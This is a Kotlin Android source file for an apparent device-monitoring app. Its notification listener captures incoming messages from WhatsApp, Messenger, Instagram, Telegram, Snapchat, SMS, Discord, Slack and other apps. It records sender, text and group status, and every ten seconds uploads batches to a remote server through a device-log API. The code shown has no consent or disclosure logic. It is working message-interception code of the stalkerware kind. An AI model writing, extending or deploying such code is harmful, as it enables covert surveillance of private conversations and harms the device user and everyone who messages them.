package com.empresa.monitor.service.social

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.os.Build
import com.empresa.monitor.data.api.ApiClient
import com.empresa.monitor.data.model.*
import kotlinx.coroutines.*
import org.json.JSONObject

/**
 * Unified notification listener for all social apps.
 * Captures messages from WhatsApp, Facebook, Instagram, Telegram, etc.
 */
class SocialNotificationListener : NotificationListenerService() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val pendingMessages = mutableListOf<SocialMessage>()
    private var deviceId: String? = null

    // Track known social apps
    private val socialApps = mapOf(
        "com.whatsapp" to SocialPlatform.WHATSAPP,
        "com.whatsapp.w4b" to SocialPlatform.WHATSAPP_BUSINESS,
        "com.facebook.katana" to SocialPlatform.FACEBOOK,
        "com.facebook.orca" to SocialPlatform.MESSENGER,
        "com.instagram.android" to SocialPlatform.INSTAGRAM,
        "org.telegram.messenger" to SocialPlatform.TELEGRAM,
        "org.telegram.plus" to SocialPlatform.TELEGRAM,
        "com.twitter.android" to SocialPlatform.TWITTER,
        "com.twitter.android.lite" to SocialPlatform.TWITTER,
        "com.snapchat.android" to SocialPlatform.SNAPCHAT,
        "com.zhiliaoapp.musically" to SocialPlatform.TIKTOK,
        "com.linkedin.android" to SocialPlatform.LINKEDIN,
        "com.google.android.apps.messaging" to SocialPlatform.SMS,
        "com.skype.raider" to SocialPlatform.SKYPE,
        "com.discord" to SocialPlatform.DISCORD,
        "com.slack" to SocialPlatform.SLACK
    )

    companion object {
        private var instance: SocialNotificationListener? = null
        fun getInstance() = instance
    }

    override fun onCreate() {
        super.onCreate()
        instance = this
        // Flush every 10 seconds
        scope.launch {
            while (isActive) {
                flushMessages()
                delay(10_000)
            }
        }
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        if (sbn == null) return

        val packageName = sbn.packageName
        val platform = socialApps.entries.firstOrNull { packageName.startsWith(it.key) } ?: return

        val extras = sbn.notification.extras
        val title = extras.getString(android.app.Notification.EXTRA_TITLE) ?: ""
        val text = extras.getCharSequence(android.app.Notification.EXTRA_TEXT)?.toString() ?: ""
        val bigText = extras.getCharSequence(android.app.Notification.EXTRA_BIG_TEXT)?.toString()
        val subText = extras.getCharSequence(android.app.Notification.EXTRA_SUB_TEXT)?.toString()

        val messageText = bigText ?: text
        if (messageText.isBlank()) return

        // Determine conversation
        val conversationTitle = extras.getString(android.app.Notification.EXTRA_CONVERSATION_TITLE)
            ?: title

        // Get all messages from grouped notifications
        val messages = mutableListOf<SocialMessage>()
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val style = sbn.notification.extras.getCharSequence(android.app.Notification.EXTRA_MESSAGES)
            if (style != null) {
                // For messaging style notifications, extract individual messages
                messages.add(SocialMessage(
                    sender = conversationTitle,
                    text = messageText,
                    platform = platform.value,
                    isGroup = extras.getBoolean(android.app.Notification.EXTRA_IS_GROUP_CONVERSATION, false)
                ))
            } else {
                messages.add(SocialMessage(
                    sender = conversationTitle,
                    text = messageText,
                    platform = platform.value,
                    isGroup = false
                ))
            }
        } else {
            messages.add(SocialMessage(
                sender = conversationTitle,
                text = messageText,
                platform = platform.value,
                isGroup = false
            ))
        }

        synchronized(pendingMessages) {
            pendingMessages.addAll(messages)
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {}

    private suspend fun flushMessages() {
        if (pendingMessages.isEmpty()) return

        val batch: List<SocialMessage>
        synchronized(pendingMessages) {
            batch = pendingMessages.toList().take(50)
            pendingMessages.removeAll(batch)
        }

        if (batch.isEmpty()) return

        // Group by platform
        val byPlatform = batch.groupBy { it.platform }

        for ((platform, msgs) in byPlatform) {
            try {
                val payload = JSONObject().apply {
                    put("platform", platform)
                    put("device_id", deviceId)
                    put("messages", msgs.map { it.toJson() })
                }
                // Send via device log endpoint
                ApiClient.api.sendDeviceLog(deviceId ?: "", DeviceLogApiRequest(
                    logType = "social_$platform",
                    dataJson = payload.toString()
                ))
            } catch (e: Exception) {
                synchronized(pendingMessages) { pendingMessages.addAll(batch) }
            }
        }
    }

    fun setDeviceId(id: String) { deviceId = id }

    override fun onDestroy() {
        instance = null
        scope.cancel()
        super.onDestroy()
    }
}

data class SocialMessage(
    val sender: String,
    val text: String,
    val platform: String,
    val isGroup: Boolean = false,
    val timestamp: Long = System.currentTimeMillis()
) {
    fun toJson(): JSONObject = JSONObject().apply {
        put("sender", sender)
        put("text", text)
        put("platform", platform)
        put("is_group", isGroup)
        put("timestamp", timestamp)
    }
}

object SocialPlatform {
    const val WHATSAPP = "whatsapp"
    const val WHATSAPP_BUSINESS = "whatsapp_business"
    const val FACEBOOK = "facebook"
    const val MESSENGER = "messenger"
    const val INSTAGRAM = "instagram"
    const val TELEGRAM = "telegram"
    const val TWITTER = "twitter"
    const val SNAPCHAT = "snapchat"
    const val TIKTOK = "tiktok"
    const val LINKEDIN = "linkedin"
    const val SMS = "sms"
    const val SKYPE = "skype"
    const val DISCORD = "discord"
    const val SLACK = "slack"
}
